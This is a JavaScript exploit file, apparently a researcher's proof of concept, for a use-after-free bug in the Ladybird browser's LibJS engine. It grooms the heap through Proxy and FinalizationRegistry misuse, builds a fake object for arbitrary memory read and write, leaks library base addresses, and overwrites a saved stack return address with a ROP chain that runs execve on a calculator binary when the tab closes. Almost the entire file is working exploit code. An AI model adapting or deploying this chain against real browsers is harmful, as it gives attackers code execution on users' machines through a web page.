// Exploit of a UAF in Ladybirds LibJS
// (working in b8fa355a21; x86_64-linux)

console.log("meow")

// misc
const OBJ_TAG = 0xfff9000000000000;
const FAKE_OBJ_BUFF_SIZE = 0x1000 - 8;
const SPRAY_SIZE = 0x40000;

// offsets
const RW_PTR_OFFSET = 0x28;
const INDEXED_STORAGE_OFFSET = 0x38;
const MAY_INTERFERE_WITH_INDEXED_PROPERTY_ACCESS_OFFSET = 0x15;
const IS_SIMPLE_STORAGE_OFFSET = 0x8;
const LIBJS_PTR_OFFSET = 0x3714b0;
const LIBC_PTR_OFFSET = 0x175b40;
const INTERNAL_GET_OFFSET = 0x80;
const LIBJS_TO_LIBC_PTR_OFFSET = 0x5d6a50;
const LIBC_ARGV_OFFSET = 0x1f86e0;
const LIBC_START_CALL_MAIN_OFFSET = 0x2a1fe;

function meow() {
    let local; // an extra local to prevent a buffer being resized during
               // a critical section
}

let flag = 0;
// an array-like object to leak
let obj = [ 0xcafebabe ];
let linked = new FinalizationRegistry(() => {});
let dummy = {};

let obj_addr;
let fake_obj;
let fake_obj_addr;
let fake_obj_buff;

let keep_alive = new Array(SPRAY_SIZE);
let defrag_token = {};

function defrag() {
    // 0x1000 chunks
    for (let i = 0; i < keep_alive.length / 2; i++) {
        keep_alive[i] = new Uint8Array(FAKE_OBJ_BUFF_SIZE);
    }

    // 0x30 chunks
    for (let i = keep_alive.length / 2; i < keep_alive.length; i++) {
        linked.register(dummy, 0x12341234, defrag_token);
    }
}

function read(addr, offset) {
    if (offset !== undefined)
        addr = Add(addr, offset);

    fake_obj_buff.subarray(RW_PTR_OFFSET).setFromHex(addr.toHex());

    return Int64.fromDouble(fake_obj[0]);
}

function write(addr, value, offset) {
    if (offset !== undefined)
        addr = Add(addr, offset);

    fake_obj_buff.subarray(RW_PTR_OFFSET).setFromHex(addr.toHex());
    fake_obj[0] = value.asDouble();
}


let handler = {
    get() {
        if (flag == 0) {
            // reallocate and free 0x30 chunk
            meow(0x94,  0x94,  0x94,  0x94,  0x94,  0x94);

            // allocate 0x30 chunk
            linked.register(obj, undefined, undefined, undefined, undefined, undefined)

            defrag();

            // hopefully the fd pointer of the node containing obj points to the dummy node.
            // and the dummy node should be next to the fake object buffer
            linked.register(dummy, 0x1337);

            fake_obj_buff = new Uint8Array(FAKE_OBJ_BUFF_SIZE);

            // gc all the things
            keep_alive = []
            linked.unregister(defrag_token);

            return null;
        } else {
            // reallocate and free 0x40 chunk
            meow(0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95);

            // allocate 0x40 chunk
            let uaf = new Uint8Array(0x38);

            // tag, and place the fake object pointer in the freed buffer
            uaf.set(Add(fake_obj_addr, OBJ_TAG).bytes(), 0);
        }
    },
};

function Construct() {
    if (flag == 0) {
        this.obj_addr = Int64.fromDouble(arguments[0]);
        this.heap_addr = Int64.fromDouble(arguments[3]);
    } else {
        fake_obj = arguments[0];

        // fixup our object for the read primitive
        fake_obj_buff.subarray(INDEXED_STORAGE_OFFSET).setFromHex(fake_obj_addr.toHex());
        fake_obj_buff.set([0x00], MAY_INTERFERE_WITH_INDEXED_PROPERTY_ACCESS_OFFSET);
        fake_obj_buff.set([0x01], IS_SIMPLE_STORAGE_OFFSET);

        let indexed_storage = read(obj_addr, INDEXED_STORAGE_OFFSET);
        console.log("obj indexed storage @ " + indexed_storage)

        let indexed_storage_vtable = read(indexed_storage);
        console.log("simple storage vtable @ " + indexed_storage_vtable)

        // patch vtable so writes don't crash
        fake_obj_buff.setFromHex(indexed_storage_vtable.toHex());
    }
}

let ConstructProxy = new Proxy(Construct, handler);

// first use of the vuln:
//
// allocate 0x30 chunk
let leaks = new ConstructProxy(
    0x93,  0x93,  0x93,  0x93,  0x93
);

obj_addr = leaks.obj_addr;
fake_obj_addr = Add(leaks.heap_addr, 0x60);
fake_obj_buff.fill(0x41)

flag = 1

// second use of the vuln:
//
// allocate 0x40 chunk
new ConstructProxy(
    0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7
);

log("obj @ " + leaks.obj_addr);
log("heap node @ " + leaks.heap_addr);
log("fake_obj @ " + fake_obj_addr);

// do all our leaks

let obj_vtable_addr = read(obj_addr)
log("obj vtable @ " + obj_vtable_addr);

let libjs_ptr = read(obj_vtable_addr)
let libjs_base = Sub(libjs_ptr, LIBJS_PTR_OFFSET)
log("libjs base @ " + libjs_base);

let libc_ptr_addr = Add(libjs_base, LIBJS_TO_LIBC_PTR_OFFSET)
let libc_ptr = read(libc_ptr_addr)
let libc_base = Sub(libc_ptr, LIBC_PTR_OFFSET)
log("libc base @ " + libc_base);

let __libc_argv = Add(libc_base, LIBC_ARGV_OFFSET)
log("__libc_argv @ " + __libc_argv);

let saved_argv = read(__libc_argv)
log("saved_argv @ " + saved_argv);

let __libc_start_call_main = Add(libc_base, LIBC_START_CALL_MAIN_OFFSET)
log("__libc_start_call_main @ " + __libc_start_call_main);

log("searching stack for saved __libc_start_call_main return address...");
const MAX_ITER = 200;
const QWORD_SIZE = 8;
let saved_return = null;

for (let i = 0, current_address = saved_argv;
        i < MAX_ITER; i++, current_address.assignSub(current_address, QWORD_SIZE)) {
    let value = read(current_address);

    if (value.asDouble() == __libc_start_call_main.asDouble()) {
        saved_return = current_address
        break
    }
}

if (!saved_return) {
    log("failed to find :(");
    throw new Error();
}

log("found! @ " + saved_return);

function rebase(offset) {
    return Add(libc_base, offset)
}

// execve("////calc", NULL, NULL)
// "/calc" is symlinked to the calculator app
chain = [
    rebase(0x00000000000d5157), // 0x00000000000d5157: pop rax; ret;
    new Int64("636c61632f2f2f2f"), // "////calc"
    rebase(0x0000000000198071), // 0x0000000000198071: pop rdi; ret;
    rebase(0x00000000001f7000),
    rebase(0x0000000000041913), // 0x0000000000041913: mov qword ptr [rdi], rax; xor eax, eax; xor edi, edi; ret;
    rebase(0x00000000000d5157), // 0x00000000000d5157: pop rax; ret;
    new Int64(0x0000000000000000), // NULL word
    rebase(0x0000000000198071), // 0x0000000000198071: pop rdi; ret;
    rebase(0x00000000001f7008),
    rebase(0x0000000000041913), // 0x0000000000041913: mov qword ptr [rdi], rax; xor eax, eax; xor edi, edi; ret;
    rebase(0x0000000000198071), // 0x0000000000198071: pop rdi; ret;
    rebase(0x00000000001f7000),
    rebase(0x000000000019cfa6), // 0x000000000019cfa6: pop rsi; add eax, 0x26224; ret;
    rebase(0x00000000001f7008),
    rebase(0x0000000000174775), // 0x0000000000174775: pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
    rebase(0x00000000001f7008),
    rebase(0x00000000000d5157), // 0x00000000000d5157: pop rax; ret;
    new Int64(0x000000000000003b),
    rebase(0x00000000000ea3f9), // 0x00000000000ea3f9: syscall; ret;
];

for (let i = 0; i < chain.length; i++) {
    if (i == 6) {
        // nan-boxing dissallows us from writing a NULL word
        // so do a weird half-write instead
        write(saved_return, chain[i], QWORD_SIZE * i);
        write(saved_return, chain[i], QWORD_SIZE * i + 6);
    } else {
        write(saved_return, chain[i], QWORD_SIZE * i);
    }
}

console.log("written rop chain!")
console.log("triggering...")

setTimeout(() => {
    // close the tab -> collapsing the stack and triggering our ROP chain
    // we could have chosen a return pointer higher up the stack, where this wouldn't be nessersery
    close()
}, 3000)
